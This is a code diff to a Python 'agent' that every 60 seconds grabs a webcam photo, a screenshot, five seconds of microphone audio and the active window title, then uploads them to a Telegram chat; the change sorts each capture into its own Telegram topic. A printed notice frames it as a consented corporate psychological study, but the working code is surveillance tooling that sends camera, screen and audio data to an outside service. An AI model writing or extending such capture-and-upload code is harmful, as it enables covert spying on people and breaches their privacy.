@@ -19,6 +19,10 @@ load_dotenv()
 # Configuration
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
+TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
+TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
+
 INTERVAL = 60  # seconds between captures
 AUDIO_DURATION = 5  # seconds
 SAMPLE_RATE = 44100
@@ -73,20 +77,32 @@ def send_to_telegram(window_title):
     
     caption = f"🖥 Active Window: {window_title}"
     
-    # Send Screenshot
+    # Send Screenshot to TOPIC_SCREENSHOT
     if os.path.exists("screen.jpg"):
         with open("screen.jpg", "rb") as f:
-            requests.post(url_photo, data={"chat_id": CHAT_ID, "caption": f"SCREENSHOT\n{caption}"}, files={"photo": f})
+            requests.post(url_photo, data={
+                "chat_id": CHAT_ID, 
+                "message_thread_id": TOPIC_SCREENSHOT,
+                "caption": f"SCREENSHOT\n{caption}"
+            }, files={"photo": f})
             
-    # Send Webcam
+    # Send Webcam to TOPIC_WEBCAM
     if os.path.exists("webcam.jpg"):
         with open("webcam.jpg", "rb") as f:
-            requests.post(url_photo, data={"chat_id": CHAT_ID, "caption": f"WEBCAM\n{caption}"}, files={"photo": f})
+            requests.post(url_photo, data={
+                "chat_id": CHAT_ID, 
+                "message_thread_id": TOPIC_WEBCAM,
+                "caption": f"WEBCAM\n{caption}"
+            }, files={"photo": f})
 
-    # Send Audio
+    # Send Audio to TOPIC_GENERAL
     if os.path.exists("audio.wav"):
         with open("audio.wav", "rb") as f:
-            requests.post(url_doc, data={"chat_id": CHAT_ID, "caption": f"AUDIO (Ambient)\n{caption}"}, files={"document": f})
+            requests.post(url_doc, data={
+                "chat_id": CHAT_ID, 
+                "message_thread_id": TOPIC_GENERAL,
+                "caption": f"AUDIO (Ambient)\n{caption}"
+            }, files={"document": f})
 
 def main():
     if not TOKEN or not CHAT_ID:
@@ -95,7 +111,7 @@ def main():
 
     print("Agent started. Press Ctrl+C to stop.")
     
-    # Initial Consent/Notice (Simple print for now, can be expanded to UI)
+    # Initial Consent/Notice
     print("--- NOTICE ---")
     print("This application is part of a corporate psychological study.")
     print("By running this, you consent to periodic screen, webcam, and audio capture.")
@@ -107,9 +123,9 @@ def main():
             print(f"[{time.strftime('%H:%M:%S')}] Capturing data... (Active: {window_title})")
             
             # Capture all data points
-            webcam_ok = capture_webcam()
-            screen_ok = capture_screenshot()
-            audio_ok = capture_audio()
+            capture_webcam()
+            capture_screenshot()
+            capture_audio()
             
             # Send to Telegram
             send_to_telegram(window_title)
@@ -119,7 +135,7 @@ def main():
                 if os.path.exists(f):
                     os.remove(f)
             
-            print(f"Payload sent. Sleeping for {INTERVAL}s...")
+            print(f"Payload sent to respective topics. Sleeping for {INTERVAL}s...")
             time.sleep(INTERVAL)
             
     except KeyboardInterrupt:
